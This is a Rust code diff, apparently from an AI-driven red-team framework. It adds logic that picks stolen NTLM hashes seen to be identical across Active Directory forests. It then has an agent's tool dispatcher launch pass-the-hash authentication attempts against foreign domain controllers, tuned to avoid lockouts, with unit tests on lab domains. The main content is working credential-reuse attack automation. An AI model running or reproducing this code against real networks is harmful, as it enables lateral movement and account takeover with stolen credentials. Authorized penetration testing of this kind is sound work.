@@ -164,6 +164,128 @@ pub(crate) fn select_cred_reuse_work(state: &StateInner) -> Vec<CrossReuseCredWo
     items
 }
 
+/// Per-principal cap on outstanding proven-reuse probes.
+const MAX_PROBES_PER_PRINCIPAL: usize = 2;
+
+/// NT hash of the empty password. Identical for every blank-password account in
+/// every domain, so it proves nothing about reuse and would fan a probe out
+/// across the whole estate.
+const NT_HASH_BLANK: &str = "31d6cfe0d16ae931b73c59d7e0c089c0";
+
+/// One pass-the-hash reuse probe: authenticate as `username` against `dc_ip`
+/// in `target_domain` using `hash_value`.
+pub(crate) struct ReuseProbeWork {
+    pub dedup_key: String,
+    pub dc_ip: String,
+    pub username: String,
+    pub target_domain: String,
+    pub hash_value: String,
+}
+
+/// NT half of an `lm:nt` pair, or the whole string when unqualified.
+fn nt_half(hash_value: &str) -> &str {
+    hash_value.rsplit(':').next().unwrap_or(hash_value)
+}
+
+/// Principals whose hash equality across domains carries no reuse signal:
+/// machine accounts (bound to their computer object) and the built-ins that
+/// ship disabled with a blank password in every domain.
+fn is_probe_principal(username: &str) -> bool {
+    if username.is_empty() || username.ends_with('$') {
+        return false;
+    }
+    let u = username.to_lowercase();
+    u != "guest" && u != "defaultaccount" && u != "krbtgt"
+}
+
+/// Select pass-the-hash reuse probes for principals whose NTLM is **already
+/// observed to be byte-identical across two domains in different forests**.
+///
+/// Proven equality replaces the name heuristic `is_reuse_candidate` uses: it is
+/// a far stronger signal, and it keeps the probe from fanning every
+/// `admin`/`svc`/`sql`-shaped principal across every foreign DC, which would
+/// generate account lockouts rather than access.
+pub(crate) fn select_proven_reuse_probe_work(state: &StateInner) -> Vec<ReuseProbeWork> {
+    let mut by_nt: std::collections::BTreeMap<String, Vec<(String, String, String)>> =
+        std::collections::BTreeMap::new();
+
+    for h in state
+        .hashes
+        .iter()
+        .filter(|h| h.hash_type.eq_ignore_ascii_case("NTLM"))
+    {
+        let nt = nt_half(&h.hash_value).to_lowercase();
+        if nt.is_empty() || nt == NT_HASH_BLANK || h.domain.is_empty() {
+            continue;
+        }
+        if !is_probe_principal(&h.username) {
+            continue;
+        }
+        by_nt.entry(nt).or_default().push((
+            h.username.clone(),
+            h.domain.clone(),
+            h.hash_value.clone(),
+        ));
+    }
+
+    let dcs = state.all_domains_with_dcs();
+    let mut items: Vec<ReuseProbeWork> = Vec::new();
+    let mut per_principal: std::collections::BTreeMap<String, usize> =
+        std::collections::BTreeMap::new();
+
+    for holders in by_nt.values() {
+        for (username, source_domain, hash_value) in holders {
+            let proven_foreign: Vec<&String> = holders
+                .iter()
+                .map(|(_, d, _)| d)
+                .filter(|d| !is_same_forest_domain(d, source_domain))
+                .collect();
+            if proven_foreign.is_empty() {
+                continue;
+            }
+
+            for (dc_domain, dc_ip) in &dcs {
+                if is_same_forest_domain(dc_domain, source_domain) {
+                    continue;
+                }
+                if !proven_foreign
+                    .iter()
+                    .any(|d| is_same_forest_domain(d, dc_domain))
+                {
+                    continue;
+                }
+
+                let key = username.to_lowercase();
+                if per_principal.get(&key).copied().unwrap_or(0) >= MAX_PROBES_PER_PRINCIPAL {
+                    continue;
+                }
+
+                let nt = nt_half(hash_value);
+                let dedup = cross_reuse_dedup_key(
+                    dc_ip,
+                    &dc_domain.to_lowercase(),
+                    username,
+                    &format!("pth:{}", &nt[..16.min(nt.len())]),
+                );
+                if state.is_processed(DEDUP_CROSS_REUSE, &dedup) {
+                    continue;
+                }
+
+                *per_principal.entry(key).or_insert(0) += 1;
+                items.push(ReuseProbeWork {
+                    dedup_key: dedup,
+                    dc_ip: dc_ip.clone(),
+                    username: username.clone(),
+                    target_domain: dc_domain.to_lowercase(),
+                    hash_value: hash_value.clone(),
+                });
+            }
+        }
+    }
+
+    items
+}
+
 pub async fn auto_credential_reuse(
     dispatcher: Arc<Dispatcher>,
     mut shutdown: watch::Receiver<bool>,
@@ -188,7 +310,7 @@ pub async fn auto_credential_reuse(
             continue;
         }
 
-        let (hash_work, cred_work) = {
+        let (hash_work, cred_work, probe_work) = {
             let state = dispatcher.state.read().await;
             if state.all_domains_with_dcs().len() < 2 {
                 continue;
@@ -196,11 +318,57 @@ pub async fn auto_credential_reuse(
             (
                 select_hash_reuse_work(&state),
                 select_cred_reuse_work(&state),
+                select_proven_reuse_probe_work(&state),
             )
         };
 
-        if hash_work.is_empty() && cred_work.is_empty() {
+        if hash_work.is_empty() && cred_work.is_empty() && probe_work.is_empty() {
             continue;
+        }
+
+        for probe in probe_work {
+            let task_id = format!("credential_reuse_probe_{}", uuid::Uuid::new_v4().simple());
+            let call = ares_llm::ToolCall {
+                id: format!("netexec_auth_check_{}", uuid::Uuid::new_v4().simple()),
+                name: "netexec_auth_check".to_string(),
+                arguments: serde_json::json!({
+                    "target": probe.dc_ip,
+                    "username": probe.username,
+                    "domain": probe.target_domain,
+                    "hash": probe.hash_value,
+                }),
+            };
+
+            info!(
+                task_id = %task_id,
+                dc = %probe.dc_ip,
+                username = %probe.username,
+                target_domain = %probe.target_domain,
+                "Dispatching proven cross-forest reuse pass-the-hash probe"
+            );
+
+            let dispatcher_bg = dispatcher.clone();
+            let probe_task_id = task_id.clone();
+            tokio::spawn(async move {
+                if let Err(e) = dispatcher_bg
+                    .llm_runner
+                    .tool_dispatcher()
+                    .dispatch_tool("credential_access", &probe_task_id, &call)
+                    .await
+                {
+                    warn!(err = %e, "Cross-forest reuse probe dispatch failed");
+                }
+            });
+
+            dispatcher
+                .state
+                .write()
+                .await
+                .mark_processed(DEDUP_CROSS_REUSE, probe.dedup_key.clone());
+            let _ = dispatcher
+                .state
+                .persist_dedup(&dispatcher.queue, DEDUP_CROSS_REUSE, &probe.dedup_key)
+                .await;
         }
 
         for (dedup_key, dc_ip, username, source_domain, hash_value) in hash_work.into_iter().take(3)
@@ -487,6 +655,119 @@ mod tests {
     fn hash_reuse_empty_state() {
         let s = StateInner::new("op".into());
         assert!(select_hash_reuse_work(&s).is_empty());
+    }
+
+    const SHARED_NT: &str = "aad3b435b51404eeaad3b435b51404ee:8d660be52b93b8048d660be52b93b804"; // pragma: allowlist secret
+    const BLANK_NT: &str = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"; // pragma: allowlist secret
+
+    fn two_forest_state() -> StateInner {
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.40".into());
+        s
+    }
+
+    #[test]
+    fn probe_emitted_for_identical_hash_across_forests() {
+        let mut s = two_forest_state();
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "contoso.local"));
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "fabrikam.local"));
+
+        let work = select_proven_reuse_probe_work(&s);
+
+        assert_eq!(work.len(), 2);
+        let targets: Vec<&str> = work.iter().map(|w| w.target_domain.as_str()).collect();
+        assert!(targets.contains(&"fabrikam.local"));
+        assert!(targets.contains(&"contoso.local"));
+        assert!(work.iter().all(|w| w.username == "svc_sql"));
+        assert!(work.iter().all(|w| w.hash_value == SHARED_NT));
+    }
+
+    #[test]
+    fn no_probe_when_hash_is_the_blank_password() {
+        let mut s = two_forest_state();
+        s.hashes
+            .push(make_hash("svc_sql", BLANK_NT, "contoso.local"));
+        s.hashes
+            .push(make_hash("svc_sql", BLANK_NT, "fabrikam.local"));
+
+        assert!(select_proven_reuse_probe_work(&s).is_empty());
+    }
+
+    #[test]
+    fn no_probe_without_a_cross_forest_twin() {
+        let mut s = two_forest_state();
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "contoso.local"));
+
+        assert!(select_proven_reuse_probe_work(&s).is_empty());
+    }
+
+    #[test]
+    fn no_probe_for_same_forest_twin() {
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.20".into());
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "contoso.local"));
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "child.contoso.local"));
+
+        assert!(select_proven_reuse_probe_work(&s).is_empty());
+    }
+
+    #[test]
+    fn no_probe_for_machine_or_builtin_principals() {
+        for user in ["DC01$", "Guest", "krbtgt"] {
+            let mut s = two_forest_state();
+            s.hashes.push(make_hash(user, SHARED_NT, "contoso.local"));
+            s.hashes.push(make_hash(user, SHARED_NT, "fabrikam.local"));
+            assert!(
+                select_proven_reuse_probe_work(&s).is_empty(),
+                "{user} should not be probed"
+            );
+        }
+    }
+
+    #[test]
+    fn probe_capped_per_principal() {
+        let mut s = two_forest_state();
+        s.domain_controllers
+            .insert("northwind.local".into(), "192.168.58.60".into());
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "contoso.local"));
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "fabrikam.local"));
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "northwind.local"));
+
+        assert_eq!(
+            select_proven_reuse_probe_work(&s).len(),
+            MAX_PROBES_PER_PRINCIPAL
+        );
+    }
+
+    #[test]
+    fn probe_respects_dedup() {
+        let mut s = two_forest_state();
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "contoso.local"));
+        s.hashes
+            .push(make_hash("svc_sql", SHARED_NT, "fabrikam.local"));
+
+        let first = select_proven_reuse_probe_work(&s);
+        assert_eq!(first.len(), 2);
+        for w in &first {
+            s.mark_processed(DEDUP_CROSS_REUSE, w.dedup_key.clone());
+        }
+
+        assert!(select_proven_reuse_probe_work(&s).is_empty());
     }
 
     #[test]
